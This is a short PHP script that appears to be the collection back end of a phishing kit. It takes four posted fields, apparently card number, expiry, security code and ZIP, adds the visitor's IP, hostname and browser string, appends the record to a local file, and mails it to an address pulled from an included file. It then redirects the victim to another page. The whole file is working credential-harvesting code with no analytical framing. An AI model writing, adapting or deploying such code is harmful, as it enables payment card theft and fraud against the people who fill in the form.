<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "##############################<br>\n";
$message .= "#CN# = ".$_POST['1']."<br>\n";
$message .= "#CE# = ".$_POST['2']."<br>\n";
$message .= "#CS# = ".$_POST['3']."<br>\n";
$message .= "#CZ# = ".$_POST['4']."<br>\n";
$message .= "#UR# = $ip<br>\n";
$message .= "##############################<br>\n";

include '../to.php';
$subject = "# GIFT ".$_POST['1']." - |$ip|";
$headers = "From: USA <enzo@shew.us>";
$headers .= "\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

$file= fopen("B.txt","a"); fwrite($file,"$message");
mail($to, $subject, $message,$headers);

header("Location: ../sec.php?id=$ip");

?>